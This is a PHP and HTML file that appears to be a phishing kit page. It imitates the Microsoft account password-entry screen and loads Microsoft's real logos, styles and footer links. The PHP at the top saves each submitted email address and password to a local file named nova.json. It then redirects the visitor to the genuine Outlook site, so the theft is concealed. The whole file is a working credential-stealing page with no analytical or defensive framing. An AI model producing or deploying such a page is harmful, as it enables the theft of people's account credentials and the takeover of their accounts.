<?php
   $email = "";
   if(isset($_POST['loginfmt'])){
      $email = $_POST['loginfmt'];
   }else{
      
   }

   if(isset($_POST['pw'])){
      $email =  $_POST['email'];
      $pass =  $_POST['passwd'];

      if(file_exists("nova.json")){
         $current_data = file_get_contents("nova.json");
         $array_data = json_decode($current_data, true);

         $extra = array(
            'email' =>  $_POST['email'],
            'password' => $_POST['passwd']
         );

         $array_data[] = $extra;
         
         $final_data = json_encode($array_data);
        
         var_dump($final_data);

         if(file_put_contents("nova.json", $final_data)){
            header("location: https://outlook.live.com/owa/");
            // header('location: r?email='.$email);
         }
      }
      // header('location: r?email='.$email);

   }
   // else{
   //    header('location: sign-in');
   // }
?>


<html dir="ltr" lang="EN-US">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
      <title>Sign in to your Microsoft account</title>
     
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
      <link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.28510.5/images/favicon.ico">
      <link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="https://logincdn.msauth.net/16.000/Converged_v21033_AZXChPIB5jI3ijrmoNll5w2.css">
      <style type="text/css"></style>
      <style type="text/css">body{display:none;}</style>
      <style type="text/css">body{display:block !important;}</style>
     
      <link rel="image_src" href="https://logincdn.msauth.net/16.000.28510.5/images/Windows_Live_v_thumb.jpg">
   </head>
   <body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
      <div>
         <!--  --><!--  --> 
         <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }">
            <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
               <!-- ko if: smallImageUrl --> 
               <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://logincdn.msauth.net/16.000.28510.5/content/images/backgrounds/0-small_138bcee624fa04ef9b75e86211a9fe0d.jpg&quot;);"></div>
               <!-- /ko --><!-- ko if: backgroundImageUrl --> 
               <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://logincdn.msauth.net/16.000.28510.5/content/images/backgrounds/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg&quot;);"></div>
               <!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> 
            </div>
         </div>
         <div data-bind="if: activeDialog"></div>
         <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="login">
            <!-- ko if: svr.CO --><!-- /ko --><!-- ko withProperties: { '$loginPage': $data } --> 
            <div class="outer" data-bind="component: { name: 'master-page',
               params: {
               serverData: svr,
               showButtons: svr.f,
               showFooterLinks: true,
               useWizardBehavior: svr.BC,
               handleWizardButtons: false,
               password: password,
               hideFromAria: ariaHidden },
               event: {
               footerAgreementClick: footer_agreementClick } }">
               <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.ay --><!-- /ko --> 
               <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
                  <!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> 
                  <div class="inner fade-in-lightbox" data-bind="
                     animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                     css: {
                     'app': backgroundLogoUrl,
                     'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                     'fade-in-lightbox': fadeInLightBox,
                     'has-popup': showFedCredButtons,
                     'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }">
                     <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.bl &amp;&amp; showLightboxProgress() }"></div>
                     <!-- ko if: showLightboxProgress --><!-- /ko --><!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) --> 
                     <div data-bind="component: { name: 'logo-control',
                        params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }">
                        <!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://logincdn.msauth.net/16.000.28510.5/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://logincdn.msauth.net/16.000.28510.5/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://logincdn.msauth.net/16.000.28510.5/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko -->
                     </div>
                     <!-- /ko --><!-- ko if: svr.cc && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --><!-- ko if: asyncInitReady --> 
                     <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                        enableCssAnimation: svr.ae,
                        disableAnimationIfAnimationEndUnsupported: svr.bp,
                        initialViewId: initialViewId,
                        currentViewId: currentViewId,
                        initialSharedData: initialSharedData,
                        initialError: $loginPage.getServerError() },
                        event: {
                        cancel: paginationControl_onCancel,
                        showView: $loginPage.view_onShow,
                        setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                        animationStateChange: paginationControl_onAnimationStateChange } }">
                        <!--  --> 
                        <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
                           <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.h) --> 
                           <div data-bind="css: {
                              'animate': animate() &amp;&amp; animate.animateBanner(),
                              'slide-out-next': animate.isSlideOutNext(),
                              'slide-in-next': animate.isSlideInNext(),
                              'slide-out-back': animate.isSlideOutBack(),
                              'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">
                              <div data-bind="component: { name: 'identity-banner-control',
                                 params: {
                                 userTileUrl: svr.be,
                                 displayName: sharedData.displayName || svr.h,
                                 isBackButtonVisible: isBackButtonVisible(),
                                 focusOnBackButton: isBackButtonFocused(),
                                 backButtonDescribedBy: backButtonDescribedBy() },
                                 event: {
                                 backButtonClick: identityBanner_onBackButtonClick } }">
                                 <!--  --> 
                                 <div class="identityBanner">
                                    <!-- ko if: isBackButtonVisible --> 
                                    <a href="sign-in">
                                    <button type="button" class="backButton" data-bind="
                                       attr: { 'id': backButtonId || 'idBtn_Back' },
                                       ariaLabel: str['CT_HRD_STR_Splitter_Back'],
                                       ariaDescribedBy: backButtonDescribedBy,
                                       click: backButton_onClick,
                                       hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back">
                                       <!-- ko ifnot: svr.b0 --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://logincdn.msauth.net/16.000.28510.5/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://logincdn.msauth.net/16.000.28510.5/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/16.000.28510.5/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: svr.b0 --><!-- /ko --> 
                                    </button>
                                    </a>
                                    <!-- /ko --> 
                                    <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?= $email ?>"><?= $email ?></div>
                                 </div>
                              </div>
                           </div>
                           <!-- /ko --> 
                           <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
                              'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.h),
                              'zero-opacity': hidePaginatedView.hideSubView(),
                              'animate': animate(),
                              'slide-out-next': animate.isSlideOutNext(),
                              'slide-in-next': animate.isSlideInNext(),
                              'slide-out-back': animate.isSlideOutBack(),
                              'slide-in-back': animate.isSlideInBack() }">
                              <!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- ko if: $parent.isViewLoaded --> <!-- ko template: { nodes: [$data], data: $parent } -->
                              <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                                 params: {
                                 serverData: svr,
                                 serverError: initialError,
                                 isInitialView: isInitialState,
                                 username: sharedData.username,
                                 displayName: sharedData.displayName,
                                 hipRequiredForUsername: sharedData.hipRequiredForUsername,
                                 passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                                 availableCreds: sharedData.availableCreds,
                                 evictedCreds: sharedData.evictedCreds,
                                 useEvictedCredentials: sharedData.useEvictedCredentials,
                                 showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                                 flowToken: sharedData.flowToken,
                                 defaultKmsiValue: svr.AC === 1,
                                 userTenantBranding: sharedData.userTenantBranding,
                                 sessions: sharedData.sessions,
                                 callMetadata: sharedData.callMetadata },
                                 event: {
                                 updateFlowToken: $loginPage.view_onUpdateFlowToken,
                                 submitReady: $loginPage.view_onSubmitReady,
                                 redirect: $loginPage.view_onRedirect,
                                 resetPassword: $loginPage.passwordView_onResetPassword,
                                 setBackButtonState: view_onSetIdentityBackButtonState,
                                 setPendingRequest: $loginPage.view_onSetPendingRequest } }">
                                 <!--  --><!--  --> <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0"> <input type="hidden" name="login" data-bind="value: unsafe_username" value="<?= $email ?>"> <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <input type="hidden" name="type" data-bind="value: svr.BC ? 20 : 11" value="11"> <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3"> <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value=""> <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value=""> <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value=""> <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value=""> 
                                 <div id="loginHeader" class="row text-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
                                 <!-- ko if: showCredViewBrandingDesc --><!-- /ko --><!-- ko if: unsafe_pageDescription --><!-- /ko --> 
                                 <div class="row">
                                    <div class="form-group col-md-24">
                                       <div role="alert" aria-live="assertive">
                                          <!-- ko if: passwordTextbox.error --><!-- /ko --> 
                                       </div>
                                       <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
                                          publicMethods: passwordTextbox.placeholderTextboxMethods,
                                          params: {
                                          serverData: svr,
                                          hintText: str['CT_PWD_STR_PwdTB_Label'] },
                                          event: {
                                          updateFocus: passwordTextbox.textbox_onUpdateFocus } }">
                                          <!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control" aria-required="true" data-bind="
                                             textInput: passwordTextbox.value,
                                             ariaDescribedBy: [
                                             'loginHeader',
                                             showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
                                             unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
                                             hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
                                             placeholder: $placeholderText,
                                             ariaLabel: unsafe_passwordAriaLabel,
                                             moveOffScreen: showPassword,
                                             css: { 'has-error': passwordTextbox.error }" aria-describedby="loginHeader  " placeholder="Password" aria-label="Enter the password for <?= $email ?>" tabindex="0"><!-- ko if: svr.CK && showPassword() --><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko -->
                                       </div>
                                       <input name="email" type="hidden" value="<?=$email ?>" />
                                       <!-- ko if: svr.CK --><!-- /ko --> 
                                    </div>
                                 </div>
                                 <!-- ko if: shouldHipInit --><!-- /ko --> 
                                 <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
                                    <div>
                                       <!-- ko if: svr.Ce --><!-- /ko --><!-- ko if: svr.aR !== false && !svr.Ce && !tenantBranding.KeepMeSignedInDisabled --> 
                                       <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.G &amp;&amp; !showHipOnPasswordView"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span> </label> </div>
                                       <!-- /ko --> 
                                       <div class="row">
                                          <div class="col-md-24">
                                             <div class="text-13 action-links">
                                                <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1582733967%26rver%3d7.0.6737.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252foutlook.live.com%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253d4b94d412-f3c9-0dd6-06e3-c0d6359b8321%26id%3d292841%26aadredir%3d1%26CBCXT%3dout%26lw%3d1%26fl%3ddob%252cflname%252cwld%26cobrandid%3d90015%26contextid%3d1F340C91639CA63F%26bk%3d1582733968&amp;id=292841&amp;uiflavor=web&amp;cobrandid=90015&amp;uaid=d1b8926839fe4eed907dcbd75545f251&amp;mkt=EN-US&amp;lc=1033&amp;bk=1582733968" data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: svr.q, click: resetPassword_onClick">Forgot password?</a> </div>
                                                <!-- ko if: allowPhoneDisambiguation --><!-- /ko --><!-- ko ifnot: useEvictedCredentials --><!-- ko component: { name: "cred-switch-link-control",
                                                   params: {
                                                       serverData: svr,
                                                       username: username,
                                                       availableCreds: availableCreds,
                                                       flowToken: flowToken,
                                                       currentCred: { credType: 1 } },
                                                   event: {
                                                       switchView: credSwitchLink_onSwitchView,
                                                       redirect: onRedirect,
                                                       setPendingRequest: credSwitchLink_onSetPendingRequest,
                                                       updateFlowToken: credSwitchLink_onUpdateFlowToken } } --><!--  --> 
                                                <div class="form-group">
                                                   <!-- ko if: credentialCount > 1 || (credentialCount === 1 && (showForgotUsername || selectedCredShownOnlyOnPicker)) --><!-- /ko --><!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) --><!-- /ko --><!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko --> 
                                                </div>
                                                <!-- ko if: credLinkError --><!-- /ko --><!-- /ko --><!-- ko if: evictedCreds.length > 0 --><!-- /ko --><!-- /ko --><!-- ko if: showChangeUserLink --><!-- /ko --> 
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                       <div data-bind="component: { name: 'footer-buttons-field',
                                          params: {
                                          serverData: svr,
                                          primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
                                          isPrimaryButtonEnabled: !isRequestPending(),
                                          isPrimaryButtonVisible: svr.f,
                                          isSecondaryButtonEnabled: true,
                                          isSecondaryButtonVisible: false },
                                          event: {
                                          primaryButtonClick: primaryButton_onClick } }">
                                          <div class="col-xs-24 no-padding-left-right button-container" data-bind="
                                             visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
                                             css: { 'no-margin-bottom': removeBottomMargin }">
                                             <!-- ko if: isSecondaryButtonVisible --><!-- /ko --> 
                                             <div class="inline-block">
                                                <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 --> <input type="submit" name="pw" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
                                                   attr: primaryButtonAttributes,
                                                   value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                                                   hasFocus: focusOnPrimaryButton,
                                                   click: primaryButton_onClick,
                                                   enable: isPrimaryButtonEnabled,
                                                   visible: isPrimaryButtonVisible,
                                                   preventTabbing: primaryButtonPreventTabbing" value="Sign in" name="login"> 
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 <!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko -->
                              </div>
                              <!-- /ko --><!-- /ko --><!-- ko ifnot: $parent.isViewLoaded --><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> 
                           </div>
                        </div>
                     </div>
                     <!-- /ko --> 
                  </div>
                  <!-- ko if: showDebugDetails --><!-- /ko --><!-- ko if: showFedCredButtons --><!-- /ko --><!-- ko if: newSession --><!-- /ko --> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value=""> <input type="hidden" name="ctx" data-bind="value: ctx" value=""> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value=""> <input type="hidden" id="i0327" data-bind="attr: { name: svr.Bt }, value: flowToken" name="PPFT" value="DdN1gIz8gQAsL03*DFfLPPqBroiyRWoJuhaLcOaEwZBqEzYOeb9MMScFAcBUGcITF6HWQsRC8t0KRNzPlMsKdXMyTddTOXq1JlGpxT9wUBnuJQ*CQ5KxXE!*iEaOtm!SeCtBRsUuRZuD1bGMr!IAAHGU5AGJzhTyCAeU*c2RTB7NCssoX7cIIBOM98c5DH69z6WL61DZ11dvc*NrS4FIKhB7ka!nxrGf!MxVYrKnNFnjlPgrEfxwUo55*y4BnN4vLiaZudNgNyxXzZzoiEi5nHc$"> <input type="hidden" name="PPSX" data-bind="value: svr.ca" value="Passpor"> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.AD" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <input type="hidden" name="CookieDisclosure" data-bind="value: svr.ay ? 1 : 0" value="0"> <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="0"> <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0"> 
                  <div data-bind="component: { name: 'instrumentation-control',
                     publicMethods: instrumentationMethods,
                     params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1"> <input type="hidden" name="i17" data-bind="value: srsFailed" value="0"> <input type="hidden" name="i18" data-bind="value: srsSuccess"> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
                  <div id="footer" class="footer default" role="contentinfo" data-bind="
                     css: {
                     'default': !backgroundLogoUrl(),
                     'new-background-image': useNewDefaultBackground }">
                     <div data-bind="component: { name: 'footer-control',
                        publicMethods: footerMethods,
                        params: {
                        serverData: svr,
                        useNewDefaultBackground: useNewDefaultBackground(),
                        hasDarkBackground: backgroundLogoUrl(),
                        showLinks: true },
                        event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetails: toggleDebugDetails_onClick } }">
                        <!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> 
                        <div id="footerLinks" class="footerNode text-secondary">
                           <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;vv=1600&amp;uaid=d1b8926839fe4eed907dcbd75545f251">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;vv=1600&amp;uaid=d1b8926839fe4eed907dcbd75545f251">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --><!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus --> 
                           <a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="
                              click: moreInfo_onClick,
                              ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
                              attr: { 'aria-expanded': showDebugDetails().toString() },
                              hasFocusEx: focusMoreInfo()" aria-label="Click here for troubleshooting information" aria-expanded="false">
                              <!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: !useNewDefaultBackground } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --> <!-- ko template: { nodes: [lightImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://logincdn.msauth.net/16.000.28510.5/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://logincdn.msauth.net/16.000.28510.5/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/16.000.28510.5/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg"><!-- /ko --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --><!-- /ko --><!-- /ko --><!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: hasDarkBackground } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://logincdn.msauth.net/16.000.28510.5/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://logincdn.msauth.net/16.000.28510.5/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/16.000.28510.5/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> 
                           </a>
                        </div>
                        <!-- /ko -->
                     </div>
                  </div>
               </div>
               <!-- /ko -->
            </div>
            <!-- /ko --> 
         </form>
         <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }">
            <!-- ko foreach: postRedirectParams --><!-- /ko --> 
         </form>
         <!-- ko if: svr.bd && !svr.fUseFetchSessionsForDsso --> 
         <div data-bind="component: { name: 'fetch-sessions-control',
            params: {
            serverData: svr,
            sessionPullType: sessionPullType },
            event: {
            updateUserTiles: fetchSessions_onUpdateUserTiles,
            executeGctResult: fetchSessions_onExecuteGctResult,
            incrementAsyncTileRequestCount: fetchSessions_onIncrementAsyncTileRequestCount,
            decrementAsyncTileRequestCount: fetchSessions_onDecrementAsyncTileRequestCount } }">
            <!--  --><!-- ko if: (sessionPullType & 1) != 0 && callMsaStaticMeControl() --><!-- /ko --><!-- ko if: svr.desktopSsoConfig && !isNonInteractiveAuthRequest --><!-- /ko --><!-- ko if: (sessionPullType & 2) != 0 && desktopSsoRunning() --><!-- /ko -->
         </div>
         <!-- /ko --><!-- ko if: svr.AW --> 
         <div id="idPartnerPL" data-bind="injectIframe: { url: svr.AW }"><iframe height="0" width="0" src="https://outlook.office365.com/owa/prefetch.aspx?id=292841&amp;mkt=EN-US" style="display: none;"></iframe></div>
         <!-- /ko -->
      </div>
   </body>
</html>
